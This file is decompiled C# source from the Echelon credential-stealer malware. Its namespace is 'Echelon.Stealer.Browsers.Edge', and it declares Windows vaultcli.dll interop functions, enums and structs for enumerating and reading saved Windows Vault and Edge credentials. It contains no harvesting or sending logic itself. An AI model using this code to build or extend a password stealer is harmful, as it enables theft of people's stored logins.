using System;
using System.Runtime.InteropServices;

namespace Echelon.Stealer.Browsers.Edge
{
	// Token: 0x0200003E RID: 62
	internal class VaultCli
	{
		// Token: 0x06000175 RID: 373
		[DllImport("vaultcli.dll")]
		public static extern int VaultOpenVault(ref Guid vaultGuid, uint offset, ref IntPtr vaultHandle);

		// Token: 0x06000176 RID: 374
		[DllImport("vaultcli.dll")]
		public static extern int VaultCloseVault(ref IntPtr vaultHandle);

		// Token: 0x06000177 RID: 375
		[DllImport("vaultcli.dll")]
		public static extern int VaultFree(ref IntPtr vaultHandle);

		// Token: 0x06000178 RID: 376
		[DllImport("vaultcli.dll")]
		public static extern int VaultEnumerateVaults(int offset, ref int vaultCount, ref IntPtr vaultGuid);

		// Token: 0x06000179 RID: 377
		[DllImport("vaultcli.dll")]
		public static extern int VaultEnumerateItems(IntPtr vaultHandle, int chunkSize, ref int vaultItemCount, ref IntPtr vaultItem);

		// Token: 0x0600017A RID: 378
		[DllImport("vaultcli.dll", EntryPoint = "VaultGetItem")]
		public static extern int VaultGetItem_WIN8(IntPtr vaultHandle, ref Guid schemaId, IntPtr pResourceElement, IntPtr pIdentityElement, IntPtr pPackageSid, IntPtr zero, int arg6, ref IntPtr passwordVaultPtr);

		// Token: 0x0600017B RID: 379
		[DllImport("vaultcli.dll", EntryPoint = "VaultGetItem")]
		public static extern int VaultGetItem_WIN7(IntPtr vaultHandle, ref Guid schemaId, IntPtr pResourceElement, IntPtr pIdentityElement, IntPtr zero, int arg5, ref IntPtr passwordVaultPtr);

		// Token: 0x0200023B RID: 571
		public enum VAULT_ELEMENT_TYPE
		{
			// Token: 0x04000A08 RID: 2568
			Undefined = -1,
			// Token: 0x04000A09 RID: 2569
			Boolean,
			// Token: 0x04000A0A RID: 2570
			Short,
			// Token: 0x04000A0B RID: 2571
			UnsignedShort,
			// Token: 0x04000A0C RID: 2572
			Int,
			// Token: 0x04000A0D RID: 2573
			UnsignedInt,
			// Token: 0x04000A0E RID: 2574
			Double,
			// Token: 0x04000A0F RID: 2575
			Guid,
			// Token: 0x04000A10 RID: 2576
			String,
			// Token: 0x04000A11 RID: 2577
			ByteArray,
			// Token: 0x04000A12 RID: 2578
			TimeStamp,
			// Token: 0x04000A13 RID: 2579
			ProtectedArray,
			// Token: 0x04000A14 RID: 2580
			Attribute,
			// Token: 0x04000A15 RID: 2581
			Sid,
			// Token: 0x04000A16 RID: 2582
			Last
		}

		// Token: 0x0200023C RID: 572
		public enum VAULT_SCHEMA_ELEMENT_ID
		{
			// Token: 0x04000A18 RID: 2584
			Illegal,
			// Token: 0x04000A19 RID: 2585
			Resource,
			// Token: 0x04000A1A RID: 2586
			Identity,
			// Token: 0x04000A1B RID: 2587
			Authenticator,
			// Token: 0x04000A1C RID: 2588
			Tag,
			// Token: 0x04000A1D RID: 2589
			PackageSid,
			// Token: 0x04000A1E RID: 2590
			AppStart = 100,
			// Token: 0x04000A1F RID: 2591
			AppEnd = 10000
		}

		// Token: 0x0200023D RID: 573
		public struct VAULT_ITEM_WIN8
		{
			// Token: 0x04000A20 RID: 2592
			public Guid SchemaId;

			// Token: 0x04000A21 RID: 2593
			public IntPtr pszCredentialFriendlyName;

			// Token: 0x04000A22 RID: 2594
			public IntPtr pResourceElement;

			// Token: 0x04000A23 RID: 2595
			public IntPtr pIdentityElement;

			// Token: 0x04000A24 RID: 2596
			public IntPtr pAuthenticatorElement;

			// Token: 0x04000A25 RID: 2597
			public IntPtr pPackageSid;

			// Token: 0x04000A26 RID: 2598
			public ulong LastModified;

			// Token: 0x04000A27 RID: 2599
			public uint dwFlags;

			// Token: 0x04000A28 RID: 2600
			public uint dwPropertiesCount;

			// Token: 0x04000A29 RID: 2601
			public IntPtr pPropertyElements;
		}

		// Token: 0x0200023E RID: 574
		public struct VAULT_ITEM_WIN7
		{
			// Token: 0x04000A2A RID: 2602
			public Guid SchemaId;

			// Token: 0x04000A2B RID: 2603
			public IntPtr pszCredentialFriendlyName;

			// Token: 0x04000A2C RID: 2604
			public IntPtr pResourceElement;

			// Token: 0x04000A2D RID: 2605
			public IntPtr pIdentityElement;

			// Token: 0x04000A2E RID: 2606
			public IntPtr pAuthenticatorElement;

			// Token: 0x04000A2F RID: 2607
			public ulong LastModified;

			// Token: 0x04000A30 RID: 2608
			public uint dwFlags;

			// Token: 0x04000A31 RID: 2609
			public uint dwPropertiesCount;

			// Token: 0x04000A32 RID: 2610
			public IntPtr pPropertyElements;
		}

		// Token: 0x0200023F RID: 575
		[StructLayout(LayoutKind.Explicit)]
		public struct VAULT_ITEM_ELEMENT
		{
			// Token: 0x04000A33 RID: 2611
			[FieldOffset(0)]
			public VaultCli.VAULT_SCHEMA_ELEMENT_ID SchemaElementId;

			// Token: 0x04000A34 RID: 2612
			[FieldOffset(8)]
			public VaultCli.VAULT_ELEMENT_TYPE Type;
		}
	}
}
